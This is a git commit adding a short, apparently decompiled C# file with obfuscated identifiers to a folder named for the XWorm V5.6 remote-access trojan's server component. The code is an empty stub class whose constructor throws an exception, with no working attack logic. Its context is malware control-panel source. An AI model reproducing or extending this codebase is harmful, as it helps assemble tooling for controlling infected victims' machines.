dd505752712eca3fbc1342a0cf8efb2e97a923f2
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:51:51 +0400

    Forms65.cs

---
+++ XWorm V5.6/Server/Forms/Forms65.cs
@@ -0,0 +1,16 @@
+﻿using Microsoft.VisualBasic.Devices;
+using System;
+using System.CodeDom.Compiler;
+using System.ComponentModel;
+using System.Runtime.CompilerServices;
+
+namespace EA7FF2D0C489326F0D2AFFF69BA6F82C
+{
+  [GeneratedCode("MyTemplate", "11.0.0.0")]
+  [EditorBrowsable(EditorBrowsableState.Never)]
+  internal class VB78A3E6E8DF638C2DV113AV7CD8B3DD : Computer
+  {
+    [MethodImpl(MethodImplOptions.NoInlining)]
+    public VB78A3E6E8DF638C2DV113AV7CD8B3DD() => throw new Exception("し");
+  }
+}
